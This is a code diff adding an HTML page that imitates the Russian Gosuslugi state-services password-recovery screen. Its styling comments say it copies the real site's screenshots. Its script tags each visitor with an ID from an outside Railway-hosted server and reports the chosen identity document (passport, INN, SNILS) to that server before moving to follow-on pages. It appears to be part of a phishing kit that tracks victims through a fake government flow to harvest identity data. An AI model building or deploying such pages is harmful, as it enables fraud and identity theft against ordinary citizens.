@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Госуслуги — Восстановление пароля</title>
+    <link rel="icon" href="favicon.ico">
+    <style>
+        body {
+            font-family: 'Lato', Arial, sans-serif;
+            background-color: #e4ecfd; /* Цвет фона как на скриншоте */
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start; /* Выравнивание по верху, чтобы учесть верхний отступ */
+            min-height: 100vh;
+        }
+        .restore-container {
+            background: #fff;
+            border-radius: 16px;
+            box-shadow: 0 4px 24px #b3c6e6aa; /* Тень как в index.html */
+            max-width: 382px;
+            width: 100%;
+            margin-top: 46px; /* Отступ сверху как в index.html */
+            padding: 60px 32px 32px 32px; /* Отступы внутри контейнера */
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            position: relative; /* Для позиционирования стрелки назад */
+        }
+        .back-arrow {
+            position: absolute;
+            top: 20px; /* Отступ сверху */
+            left: 20px; /* Отступ слева */
+            width: 32px; /* Размер кнопки */
+            height: 32px; /* Размер кнопки */
+            border-radius: 50%; /* Круглая форма */
+            border: 1px solid #dcdcdc; /* Светлая рамка */
+            background-color: #fff; /* Белый фон */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1); /* Легкая тень */
+        }
+        .back-arrow svg {
+             width: 18px; /* Размер стрелки SVG */
+             height: 18px; /* Размер стрелки SVG */
+             stroke: #0d4cd3; /* Цвет стрелки */
+             stroke-width: 2; /* Толщина линии стрелки */
+             fill: none;
+             stroke-linecap: round;
+             stroke-linejoin: round;
+        }
+        .logo {
+            display: block;
+            margin: 0 auto 43px auto; /* Отступы логотипа как в index.html */
+            width: 194px;
+            height: 34px;
+            line-height: 1;
+        }
+        .title {
+            font-size: 24px; /* Размер шрифта заголовка */
+            color: #0b1f33; /* Цвет текста заголовка */
+            margin: 0 0 30px 0; /* Отступ снизу */
+            text-align: center;
+            font-weight: normal; /* Сделаем текст нежирным */
+        }
+        .doc-link {
+            color: #0d4cd3; /* Синий цвет ссылок */
+            font-size: 16px;
+            text-decoration: none;
+            margin-bottom: 20px; /* Отступ снизу между ссылками */
+        }
+        .doc-link:last-child {
+            margin-bottom: 0; /* Убираем отступ у последней ссылки */
+        }
+    </style>
+</head>
+<body>
+    <div class="restore-container">
+        <button class="back-arrow">
+            <svg viewBox="0 0 24 24">
+                <path d="M15 18l-6-6 6-6"/>
+            </svg>
+        </button>
+        <img src="logo.4db68cf668f7092d.svg" alt="Госуслуги" class="logo">
+        <h1 class="title">Восстановление пароля</h1>
+        <a href="pasport_rf.html" class="doc-link">Паспорт РФ</a>
+        <a href="inn.html" class="doc-link">ИНН</a>
+        <a href="snils.html" class="doc-link">СНИЛС</a>
+    </div>
+
+    <script src="assets/d4b72c006a7771677225038852ee8b96/noty.min.js"></script>
+    <script>
+        // Конфигурация сервера
+        const env = {
+            SERVER_URL: 'https://server-production-4599.up.railway.app',
+            API_ENDPOINT_AUTH: '/auth-visit',
+            API_ENDPOINT_STATUS: '/status',
+            API_ENDPOINT_STEP: '/step'
+        };
+
+        // JavaScript для кнопки назад (просто перенаправление на index.html)
+        document.querySelector('.back-arrow').addEventListener('click', function() {
+            window.location.href = 'index2.html';
+        });
+
+        // Функция для получения или создания userId
+        async function getOrCreateUserId() {
+            let userId = localStorage.getItem('user_id');
+            if (!userId) {
+                try {
+                    const res = await fetch(`${env.SERVER_URL}${env.API_ENDPOINT_AUTH}`, { method: 'POST' });
+                    const data = await res.json();
+                    userId = data.userId;
+                    localStorage.setItem('user_id', userId);
+                } catch (e) {
+                    userId = null;
+                }
+            }
+            return userId;
+        }
+
+        // JavaScript for document links (Паспорт РФ, ИНН, СНИЛС)
+        const docLinks = document.querySelectorAll('.doc-link');
+
+        docLinks.forEach(link => {
+            link.addEventListener('click', async function(event) {
+                event.preventDefault();
+
+                const documentType = this.textContent.trim();
+                const targetHref = this.href;
+
+                const userId = await getOrCreateUserId();
+                const dataToSend = {
+                    step: 'document_type',
+                    value: documentType,
+                    origin: 'Восстановление',
+                    userId: userId
+                };
+
+                try {
+                    const response = await fetch(`${env.SERVER_URL}${env.API_ENDPOINT_STEP}`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(dataToSend)
+                    });
+
+                    if (response.ok) {
+                        const result = await response.json();
+                        console.log('Document type sent successfully:', result);
+                        window.location.href = targetHref;
+                    } else {
+                        console.error('Failed to send document type data:', response.status, response.statusText);
+                        alert('Произошла ошибка при отправке данных о документе.');
+                    }
+                } catch (error) {
+                    console.error('Error sending document type data:', error);
+                    alert('Произошла сетевая ошибка при отправке данных о документе.');
+                }
+            });
+        });
+    </script>
+</body>
+</html> 
